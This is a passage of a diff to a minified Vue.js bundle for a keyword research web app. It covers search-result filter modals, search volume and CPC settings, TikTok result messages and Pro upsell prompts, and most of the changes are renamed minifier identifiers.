                 P = k("search-results-settings-modal-search-volume-trend"),
-                $ = k("search-results-settings-modal-average-cpc"),
-                D = k("search-results-settings-modal-bing-competition"),
+                D = k("search-results-settings-modal-average-cpc"),
+                j = k("search-results-settings-modal-bing-competition"),
                 O = k("search-results-settings-modal-competition"),
                 V = k("search-results-settings-filter-positive-keywords"),
                 H = k("search-results-settings-filter-negative-keywords"),
                 I = k("alert-pro-upsell"),
                 N = k("search-results-settings-admin-settings"),
-                R = k("search-results-settings-modal"),
-                K = k("search-results-tabs"),
-                J = k("has-error"),
-                W = k("suggest-page-reload"),
+                B = k("search-results-settings-modal"),
+                R = k("search-results-tabs"),
+                K = k("has-error"),
+                J = k("suggest-page-reload"),
                 z = k("google-search-volume-summary"),
                 Y = k("show-upsell"),
                 G = k("google-search-volume-result"),
@@ -22476,7 +22498,7 @@ const nR = Ue(aI, [
                 oe = k("dropdown-menu-item-copy-keywords-search-volume"),
                 ie = k("dropdown-menu-item-copy-keywords-all-data"),
                 ne = k("search-results-actions"),
-                le = L("mask");
+                le = $("mask");
             return b(), g("div", null, [E(i, {
                 loading: e.loading
             }, null, 8, ["loading"]), S("div", oI, [S("div", iI, [E(n, {
@@ -22516,13 +22538,13 @@ const nR = Ue(aI, [
                 href: "javascript:;"
             }, "×")])) : T("", !0)], 64)) : T("", !0), e.current_permissions.show_view_count_data ? (b(), g(y, {
                 key: 5
-            }, [e.show_current_filter_view_count_min > 0 || e.show_current_filter_view_count_max > 0 ? (b(), g("button", AI, [S("strong", PI, v(e.trans.get("Views")) + ":", 1), e.show_current_filter_view_count_min > 0 && e.show_current_filter_view_count_max > 0 ? (b(), g("span", LI, v(e.$filters.digit(e.show_current_filter_view_count_min)) + " " + v(e.trans.get("to")) + " " + v(e.$filters.digit(e.show_current_filter_view_count_max)), 1)) : e.show_current_filter_view_count_min > 0 && !e.show_current_filter_view_count_max ? (b(), g("span", BI, v(e.trans.get("more than")) + " " + v(e.$filters.digit(e.show_current_filter_view_count_min)), 1)) : !e.show_current_filter_view_count_min && e.show_current_filter_view_count_max > 0 ? (b(), g("span", $I, v(e.trans.get("less than")) + " " + v(e.$filters.digit(e.show_current_filter_view_count_max)), 1)) : T("", !0), S("a", {
+            }, [e.show_current_filter_view_count_min > 0 || e.show_current_filter_view_count_max > 0 ? (b(), g("button", AI, [S("strong", PI, v(e.trans.get("Views")) + ":", 1), e.show_current_filter_view_count_min > 0 && e.show_current_filter_view_count_max > 0 ? (b(), g("span", $I, v(e.$filters.digit(e.show_current_filter_view_count_min)) + " " + v(e.trans.get("to")) + " " + v(e.$filters.digit(e.show_current_filter_view_count_max)), 1)) : e.show_current_filter_view_count_min > 0 && !e.show_current_filter_view_count_max ? (b(), g("span", LI, v(e.trans.get("more than")) + " " + v(e.$filters.digit(e.show_current_filter_view_count_min)), 1)) : !e.show_current_filter_view_count_min && e.show_current_filter_view_count_max > 0 ? (b(), g("span", DI, v(e.trans.get("less than")) + " " + v(e.$filters.digit(e.show_current_filter_view_count_max)), 1)) : T("", !0), S("a", {
                 onClick: t[5] || (t[5] = t => e.clearFilter("view_count")),
                 class: "search-results-settings-display-view-count-remove ml-1 text-decoration-none",
                 href: "javascript:;"
             }, "×")])) : T("", !0)], 64)) : T("", !0), e.current_permissions.show_is_verified_data ? (b(), g(y, {
                 key: 6
-            }, [e.show_current_filter_is_verified ? (b(), g("button", DI, [S("strong", OI, v(e.trans.get("Is Verified")) + ":", 1), S("span", jI, v(e.format_boolean_filter(e.show_current_filter_is_verified)), 1), S("a", {
+            }, [e.show_current_filter_is_verified ? (b(), g("button", jI, [S("strong", OI, v(e.trans.get("Is Verified")) + ":", 1), S("span", WI, v(e.format_boolean_filter(e.show_current_filter_is_verified)), 1), S("a", {
                 class: "search-results-settings-display-is-verified-remove ms-1 text-decoration-none",
                 href: "javascript:",
                 onClick: t[6] || (t[6] = t => e.clearFilter("is_verified", "all"))
@@ -22564,7 +22586,7 @@ const nR = Ue(aI, [
                 show_current_split_negative_keywords: e.show_current_split_negative_keywords,
                 show_display_filter_negative_keywords: e.show_display_filter_negative_keywords,
                 onClearFilter: e.clearFilter
-            }, null, 8, ["show_current_split_negative_keywords", "show_display_filter_negative_keywords", "onClearFilter"])]), E(R, {
+            }, null, 8, ["show_current_split_negative_keywords", "show_display_filter_negative_keywords", "onClearFilter"])]), E(B, {
                 onResetFilter: e.resetFilter,
                 onApplyFilter: e.applyFilter,
                 filter_counter: e.filter_counter,
@@ -22573,12 +22595,12 @@ const nR = Ue(aI, [
             }, {
                 content: C((() => [e.current_permissions.show_search_volume_data ? (b(), g(y, {
                     key: 0
-                }, [e.current_permissions.show_currency_settings ? (b(), g("div", VI, [S("div", HI, [S("h5", II, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", NI, [S("div", RI, [S("div", KI, [S("label", JI, v(e.trans.get("Country")), 1), S("input", {
+                }, [e.current_permissions.show_currency_settings ? (b(), g("div", VI, [S("div", HI, [S("h5", II, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", NI, [S("div", BI, [S("div", RI, [S("label", KI, v(e.trans.get("Country")), 1), S("input", {
                     disabled: "disabled",
                     class: "form-control",
                     type: "text",
                     value: e.selected_country_language_name
-                }, null, 8, WI)])]), e.current_permissions.show_currency_settings ? (b(), g("div", zI, [S("div", YI, [S("label", GI, v(e.trans.get("Currency")), 1), E(w, {
+                }, null, 8, JI)])]), e.current_permissions.show_currency_settings ? (b(), g("div", zI, [S("div", YI, [S("label", GI, v(e.trans.get("Currency")), 1), E(w, {
                     id: "metrics_currency_selection",
                     class: "search-results-settings-modal-currency-value",
                     "model-value": e.current_metrics_currency,
@@ -22727,7 +22749,7 @@ const nR = Ue(aI, [
                 }, null, 2), [
                     [le, e.integer_format],
                     [U, e.current_filter_view_count_max]
-                ])])])])) : T("", !0)])) : T("", !0), e.current_permissions.show_is_verified_data ? (b(), g("div", LN, [e.current_permissions.show_is_verified_data ? (b(), g("div", BN, [S("div", $N, [S("label", DN, v(e.trans.get("Is Verified")), 1), S("div", ON, [F(S("input", {
+                ])])])])) : T("", !0)])) : T("", !0), e.current_permissions.show_is_verified_data ? (b(), g("div", $N, [e.current_permissions.show_is_verified_data ? (b(), g("div", LN, [S("div", DN, [S("label", jN, v(e.trans.get("Is Verified")), 1), S("div", ON, [F(S("input", {
                     class: "form-check-input",
                     type: "radio",
                     name: "is_verified",
@@ -22735,8 +22757,8 @@ const nR = Ue(aI, [
                     value: "",
                     "onUpdate:modelValue": t[21] || (t[21] = t => e.current_filter_is_verified = t),
                     checked: "" == e.current_filter_is_verified
-                }, null, 8, jN), [
-                    [j, e.current_filter_is_verified]
+                }, null, 8, WN), [
+                    [W, e.current_filter_is_verified]
                 ]), VN]), S("div", HN, [F(S("input", {
                     class: "form-check-input",
                     type: "radio",
@@ -22746,8 +22768,8 @@ const nR = Ue(aI, [
                     "onUpdate:modelValue": t[22] || (t[22] = t => e.current_filter_is_verified = t),
                     checked: "1" == e.current_filter_is_verified
                 }, null, 8, IN), [
-                    [j, e.current_filter_is_verified]
-                ]), NN]), S("div", RN, [F(S("input", {
+                    [W, e.current_filter_is_verified]
+                ]), NN]), S("div", BN, [F(S("input", {
                     class: "form-check-input",
                     type: "radio",
                     name: "is_verified",
@@ -22755,9 +22777,9 @@ const nR = Ue(aI, [
                     value: "0",
                     "onUpdate:modelValue": t[23] || (t[23] = t => e.current_filter_is_verified = t),
                     checked: "0" == e.current_filter_is_verified
-                }, null, 8, KN), [
-                    [j, e.current_filter_is_verified]
-                ]), JN])])])) : T("", !0)])) : T("", !0), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", WN, [S("div", zN, [E(A, {
+                }, null, 8, RN), [
+                    [W, e.current_filter_is_verified]
+                ]), KN])])])) : T("", !0)])) : T("", !0), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", JN, [S("div", zN, [E(A, {
                     current_permissions: e.current_permissions,
                     search_volume_format: e.search_volume_format,
                     error_fields: e.error_fields,
@@ -22773,7 +22795,7 @@ const nR = Ue(aI, [
                     "onUpdate:current_filter_search_volume_trend_min": t[26] || (t[26] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[27] || (t[27] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", YN, [E($, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", YN, [E(D, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -22781,7 +22803,7 @@ const nR = Ue(aI, [
                     "onUpdate:current_filter_average_cpc_min": t[28] || (t[28] = t => e.current_filter_average_cpc_min = t),
                     current_filter_average_cpc_max: e.current_filter_average_cpc_max,
                     "onUpdate:current_filter_average_cpc_max": t[29] || (t[29] = t => e.current_filter_average_cpc_max = t)
-                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"]), e.current_permissions.show_competition_dropdown_settings ? (b(), x(D, {
+                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"]), e.current_permissions.show_competition_dropdown_settings ? (b(), x(j, {
                     key: 0,
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
@@ -22819,12 +22841,12 @@ const nR = Ue(aI, [
                         innerHTML: e.trans.get("Need to add more than :count_free negative keywords?", {
                             count_free: 5
                         })
-                    }, null, 8, eR)])),
+                    }, null, 8, eB)])),
                     linktext: C((() => [S("span", {
                         innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                             count_pro: "2,000"
                         })
-                    }, null, 8, tR)])),
+                    }, null, 8, tB)])),
                     _: 1
                 }, 8, ["current_permissions", "routes"])), E(N, {
                     current_permissions: e.current_permissions,
@@ -22838,20 +22860,20 @@ const nR = Ue(aI, [
                     reset_all_metrics_url: e.current_reset_all_metrics_url
                 }, null, 8, ["current_permissions", "current_filter_keyword_result_period", "current_keyword_result_periods", "search_engine", "current_tab", "reset_keywords_url", "reset_latest_metrics_url", "reset_all_metrics_url"])])),
                 _: 1
-            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(K, {
+            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(R, {
                 onApplyTab: o.applyTab,
                 tabs: e.tabs,
                 current_tab: e.current_tab,
                 loading: e.loading
-            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(J, {
+            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(K, {
                 key: 0,
                 user_is_paid: e.user_is_paid,
                 has_metrics: e.has_metrics,
                 onFetch: o.fetch,
                 current_tab: e.current_tab
-            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(W, {
+            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(J, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", rR, [S("div", sR, [E(z, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", rB, [S("div", sB, [E(z, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 summaries: e.summaries,
@@ -22864,8 +22886,8 @@ const nR = Ue(aI, [
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"]))])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", aR, [E(X, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", aB, [E(X, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
@@ -22906,7 +22928,7 @@ const nR = Ue(aI, [
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                message: C((() => [7 == e.current_tab ? (b(), g("h4", oR, v(e.trans.get("Sorry, TikTok does not provide any hashtags for your query")), 1)) : (b(), g("h4", iR, v(e.trans.get("Sorry, TikTok does not provide any keyword suggestions for your query")), 1))])),
+                message: C((() => [7 == e.current_tab ? (b(), g("h4", oB, v(e.trans.get("Sorry, TikTok does not provide any hashtags for your query")), 1)) : (b(), g("h4", iB, v(e.trans.get("Sorry, TikTok does not provide any keyword suggestions for your query")), 1))])),
                 _: 1
             }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(Z, {
                 onMore: e.more,
@@ -22946,13 +22968,13 @@ const nR = Ue(aI, [
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket", "has_error", "has_all_error"])])
         }]
     ]),
-    lR = {
+    lB = {
         class: "row g-0 me-lg-n1px"
     },
-    cR = {
+    cB = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const _R = Ue({
+const _B = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -22965,7 +22987,7 @@ const _R = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", lR, [S("div", cR, [E(i, {
+            return b(), g("div", lB, [S("div", cB, [E(i, {
                 disabled: e.loading,
                 id: "keyword_language_" + e.id,
                 options: e.language_options,
@@ -22990,17 +23012,17 @@ const _R = Ue({
             ])])])
         }]
     ]),
-    uR = {
+    uB = {
         class: "row g-0 me-lg-n1px"
     },
-    dR = {
+    dB = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    mR = {
+    mB = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
-const hR = Ue({
-        mixins: [DT],
+const hB = Ue({
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/tiktok/languages",
@@ -23018,7 +23040,7 @@ const hR = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", uR, [S("div", dR, [E(i, {
+            return b(), g("div", uB, [S("div", dB, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -23034,7 +23056,7 @@ const hR = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", mR, [E(i, {
+            ])]), S("div", mB, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -23047,35 +23069,35 @@ const hR = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])])])
         }]
     ]),
-    pR = ["value"],
-    gR = ["value"],
-    yR = {
+    pB = ["value"],
+    gB = ["value"],
+    yB = {
         key: 2,
         class: "row"
     },
-    wR = {
+    wB = {
         class: "col-12"
     },
-    fR = {
+    fB = {
         class: "check-search-volume-settings-country mb-3"
     },
-    bR = {
+    bB = {
         class: "form-label check-search-volume-settings-country-label"
     },
-    vR = {
+    vB = {
         key: 3,
         class: "row"
     },
-    kR = {
+    kB = {
         class: "col-12"
     },
-    xR = {
+    xB = {
         class: "check-search-volume-settings-currency mb-3"
     },
-    CR = {
+    CB = {
         class: "form-label check-search-volume-settings-currency-label"
     };
-const SR = Ue({
+const SB = Ue({
         mixins: [IT]
     }, [
         ["render", function(e, t, r, s, a, o) {
@@ -23085,12 +23107,12 @@ const SR = Ue({
                 name: "metrics_country",
                 type: "hidden",
                 value: e.country
-            }, null, 8, pR)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
+            }, null, 8, pB)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
                 key: 1,
                 name: "metrics_currency",
                 type: "hidden",
                 value: e.currency
-            }, null, 8, gR)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", yR, [S("div", wR, [S("div", fR, [S("label", bR, v(e.trans.get("Country")), 1), E(i, {
+            }, null, 8, gB)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", yB, [S("div", wB, [S("div", fB, [S("label", bB, v(e.trans.get("Country")), 1), E(i, {
                 options: e.current_country_list,
                 settings: e.country_settings,
                 class: "check-search-volume-settings-country-value",
@@ -23098,7 +23120,7 @@ const SR = Ue({
                 "onUpdate:modelValue": t[0] || (t[0] = t => e.current_metrics_country = t),
                 "model-value": e.current_metrics_country,
                 placeholder: e.trans.get("Type a country")
-            }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", vR, [S("div", kR, [S("div", xR, [S("label", CR, v(e.trans.get("Currency")), 1), E(i, {
+            }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", vB, [S("div", kB, [S("div", xB, [S("label", CB, v(e.trans.get("Currency")), 1), E(i, {
                 options: e.current_currency_list,
                 settings: e.currency_settings,
                 class: "check-search-volume-settings-currency-value",
@@ -23109,113 +23131,113 @@ const SR = Ue({
             }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0)])
         }]
     ]),
-    TR = {
+    TB = {
         class: "search-results-settings my-2"
     },
-    FR = {
+    FB = {
         class: "search-results-settings-display mx-n1"
     },
-    qR = {
+    qB = {
         key: 0,
         class: "row"
     },
-    ER = {
+    EB = {
         class: "col"
     },
-    UR = {
+    UB = {
         class: "search-results-settings-modal-header mb-3 pb-1 border-bottom"
     },
-    MR = {
+    MB = {
         key: 1,
         class: "row"
     },
-    AR = {
+    AB = {
         class: "col-12 col-md-6"
     },
-    PR = {
+    PB = {
         class: "search-results-settings-modal-country mb-3"
     },
-    LR = {
+    $B = {
         class: "form-label search-results-settings-modal-country-label"
     },
-    BR = ["value"],
-    $R = {
+    LB = ["value"],
+    DB = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    DR = {
+    jB = {
         class: "search-results-settings-modal-currency mb-3"
     },
-    OR = {
+    OB = {
         class: "form-label search-results-settings-modal-currency-label"
     },
-    jR = {
+    WB = {
         key: 2,
         class: "row"
     },
-    VR = {
+    VB = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    HR = {
+    HB = {
         key: 1,
         class: "col-12 col-md-6"
     },
-    IR = {
+    IB = {
         class: "row"
     },
-    NR = {
+    NB = {
         class: "col"
     },
-    RR = {
+    BB = {
         class: "search-results-settings-modal-header my-3 pb-1 border-bottom"
     },
-    KR = {
+    RB = {
         key: 1,
         class: "row"
     },
-    JR = {
+    KB = {
         class: "col-12 col-md-6"
     },
-    WR = {
+    JB = {
         class: "col-12 col-md-6"
     },
-    zR = {
+    zB = {
         class: "row"
     },
-    YR = {
+    YB = {
         class: "col-12"
     },
-    GR = {
+    GB = {
         class: "row"
     },
-    XR = {
+    XB = {
         class: "col-12"
     },
-    QR = ["innerHTML"],
-    ZR = ["innerHTML"],
-    eK = {
+    QB = ["innerHTML"],
+    ZB = ["innerHTML"],
+    eR = {
         class: "search-results-summary card my-4 bg-light"
     },
-    tK = {
+    tR = {
         class: "card-body"
     },
-    rK = {
+    rR = {
         class: "search-results-keywords my-3"
     },
-    sK = {
+    sR = {
         key: 0,
         class: "mb-4"
     },
-    aK = {
+    aR = {
         key: 1,
         class: "mb-4"
     };
-const oK = Ue({
+const oR = Ue({
         mixins: [mp],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         computed: {
             show_upsell() {
@@ -23332,19 +23354,19 @@ const oK = Ue({
                 M = k("search-results-settings-modal-search-volume-trend"),
                 A = k("search-results-settings-modal-average-cpc"),
                 P = k("search-results-settings-modal-bing-competition"),
-                L = k("search-results-settings-modal-competition"),
-                $ = k("search-results-settings-filter-positive-keywords"),
-                D = k("search-results-settings-filter-negative-keywords"),
+                $ = k("search-results-settings-modal-competition"),
+                D = k("search-results-settings-filter-positive-keywords"),
+                j = k("search-results-settings-filter-negative-keywords"),
                 O = k("alert-pro-upsell"),
-                j = k("search-results-settings-admin-settings"),
+                W = k("search-results-settings-admin-settings"),
                 V = k("search-results-settings-modal"),
                 H = k("search-results-tabs"),
                 I = k("has-error"),
                 N = k("suggest-page-reload"),
-                R = k("google-search-volume-summary"),
-                K = k("show-upsell"),
-                J = k("google-search-volume-result"),
-                W = k("search-results-table-wrapper"),
+                B = k("google-search-volume-summary"),
+                R = k("show-upsell"),
+                K = k("google-search-volume-result"),
+                J = k("search-results-table-wrapper"),
                 z = k("search-results-no-keyword-found"),
                 Y = k("has-more"),
                 G = k("dropdown-menu-item-add-basket"),
@@ -23357,7 +23379,7 @@ const oK = Ue({
                 se = k("search-results-actions");
             return b(), g("div", null, [E(i, {
                 loading: e.loading
-            }, null, 8, ["loading"]), S("div", TR, [S("div", FR, [E(n, {
+            }, null, 8, ["loading"]), S("div", TB, [S("div", FB, [E(n, {
                 onClearFilter: e.clearFilter,
                 current_permissions: e.current_permissions,
                 show_current_filter_keyword_result_period: e.show_current_filter_keyword_result_period,
@@ -23409,29 +23431,29 @@ const oK = Ue({
             }, {
                 content: C((() => [e.current_permissions.show_search_volume_data ? (b(), g(y, {
                     key: 0
-                }, [e.current_permissions.show_currency_settings ? (b(), g("div", qR, [S("div", ER, [S("h5", UR, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", MR, [S("div", AR, [S("div", PR, [S("label", LR, v(e.trans.get("Country")), 1), S("input", {
+                }, [e.current_permissions.show_currency_settings ? (b(), g("div", qB, [S("div", EB, [S("h5", UB, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", MB, [S("div", AB, [S("div", PB, [S("label", $B, v(e.trans.get("Country")), 1), S("input", {
                     disabled: "disabled",
                     class: "form-control",
                     type: "text",
                     value: e.selected_country_language_name
-                }, null, 8, BR)])]), e.current_permissions.show_currency_settings ? (b(), g("div", $R, [S("div", DR, [S("label", OR, v(e.trans.get("Currency")), 1), E(w, {
+                }, null, 8, LB)])]), e.current_permissions.show_currency_settings ? (b(), g("div", DB, [S("div", jB, [S("label", OB, v(e.trans.get("Currency")), 1), E(w, {
                     id: "metrics_currency_selection",
                     class: "search-results-settings-modal-currency-value",
                     "model-value": e.current_metrics_currency,
                     options: e.current_currency_list,
                     settings: {},
                     disabled: 4 == e.current_tab
-                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", jR, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", VR, [E(f, {
+                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", WB, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", VB, [E(f, {
                     current_network_list: e.current_network_list,
                     current_metrics_network: e.current_metrics_network,
                     "onUpdate:current_metrics_network": t[0] || (t[0] = t => e.current_metrics_network = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", HR, [E(q, {
+                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", HB, [E(q, {
                     current_currency_list: e.current_currency_list,
                     current_metrics_currency: e.current_metrics_currency,
                     "onUpdate:current_metrics_currency": t[1] || (t[1] = t => e.current_metrics_currency = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)]))], 64)) : T("", !0), S("div", IR, [S("div", NR, [S("h5", RR, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", KR, [S("div", JR, [E(U, {
+                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)]))], 64)) : T("", !0), S("div", IB, [S("div", NB, [S("h5", BB, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", RB, [S("div", KB, [E(U, {
                     current_permissions: e.current_permissions,
                     search_volume_format: e.search_volume_format,
                     error_fields: e.error_fields,
@@ -23447,7 +23469,7 @@ const oK = Ue({
                     "onUpdate:current_filter_search_volume_trend_min": t[4] || (t[4] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[5] || (t[5] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", WR, [E(A, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", JB, [E(A, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -23460,7 +23482,7 @@ const oK = Ue({
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[8] || (t[8] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(L, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x($, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -23469,7 +23491,7 @@ const oK = Ue({
                     "onUpdate:current_filter_competition_min": t[9] || (t[9] = t => e.current_filter_competition_min = t),
                     current_filter_competition_max: e.current_filter_competition_max,
                     "onUpdate:current_filter_competition_max": t[10] || (t[10] = t => e.current_filter_competition_max = t)
-                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", zR, [S("div", YR, [E($, {
+                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", zB, [S("div", YB, [E(D, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -23478,7 +23500,7 @@ const oK = Ue({
                     "onUpdate:current_filter_keywords": t[11] || (t[11] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[12] || (t[12] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", GR, [S("div", XR, [E(D, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", GB, [S("div", XB, [E(j, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
@@ -23492,14 +23514,14 @@ const oK = Ue({
                         innerHTML: e.trans.get("Need to add more than :count_free negative keywords?", {
                             count_free: 5
                         })
-                    }, null, 8, QR)])),
+                    }, null, 8, QB)])),
                     linktext: C((() => [S("span", {
                         innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                             count_pro: "2,000"
                         })
-                    }, null, 8, ZR)])),
+                    }, null, 8, ZB)])),
                     _: 1
-                }, 8, ["current_permissions", "routes"]), E(j, {
+                }, 8, ["current_permissions", "routes"]), E(W, {
                     current_permissions: e.current_permissions,
                     current_filter_keyword_result_period: e.current_filter_keyword_result_period,
                     "onUpdate:current_filter_keyword_result_period": t[14] || (t[14] = t => e.current_filter_keyword_result_period = t),
@@ -23524,7 +23546,7 @@ const oK = Ue({
                 current_tab: e.current_tab
             }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(N, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", eK, [S("div", tK, [E(R, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", eR, [S("div", tR, [E(B, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 summaries: e.summaries,
@@ -23532,18 +23554,18 @@ const oK = Ue({
                 show_pie_chart: e.show_pie_chart,
                 current_permissions: e.current_permissions,
                 current_metrics_currency: e.current_metrics_currency
-            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), !o.show_upsell || 1 != e.current_tab && 7 != e.current_tab ? T("", !0) : (b(), x(K, {
+            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), !o.show_upsell || 1 != e.current_tab && 7 != e.current_tab ? T("", !0) : (b(), x(R, {
                 key: 0,
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"]))])], 512), [
